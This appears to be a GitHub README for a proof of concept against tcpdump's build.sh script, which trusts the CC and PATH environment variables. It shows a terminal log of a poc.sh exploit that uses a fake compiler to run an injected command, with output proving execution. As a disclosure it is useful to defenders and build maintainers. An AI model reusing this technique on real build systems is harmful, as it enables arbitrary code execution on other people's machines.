# TCPdump-Poc

The vulnerability arises from improper handling of environment variables in the build.sh script. Specifically, the CC and PATH variables, which are used to define the compiler and executable search paths, are not sanitized or validated before being used in the build process. An attacker can set CC to a malicious script or executable that performs arbitrary actions when the script is executed.


┌─[b7z@parrot]─[~/test/tcpdump/exploit]
└──╼ $./poc.sh "id > /tmp/scripthacker" /tmp/gccc /home/b7z/test/tcpdump/build.sh 
[+] Setting up malicious environment...
[+] Triggering vulnerable build script (/home/b7z/test/tcpdump/build.sh)...
PREFIX set to '/tmp/tcpdump_build.qMNdzUh3'
gcc (GCC) 12.2.0; 
Compiler identification: gcc-12.2.0
$ ./autogen.sh
autoreconf identification: 2.71
configure.ac:32: warning: The macro `AC_PROG_CC_C99' is obsolete.
configure.ac:32: You should run autoupdate.
./lib/autoconf/c.m4:1659: AC_PROG_CC_C99 is expanded from...
configure.ac:32: the top level
$ ./configure --with-crypto=no --enable-smb=no --prefix=/tmp/tcpdump_build.qMNdzUh3 --disable-local-libpcap
checking build system type... x86_64-pc-linux-gnu
checking host system type... x86_64-pc-linux-gnu
checking for gcc... /tmp/gccc
checking whether the C compiler works... no
configure: error: in `/home/b7z/test/tcpdump':
configure: error: C compiler cannot create executables
See `config.log' for more details
[!] EXPLOIT SUCCESSFUL: Payload executed.
Proof: uid=1000(b7z) gid=1001(b7z) groups=1001(b7z),24(cdrom),25(floppy)
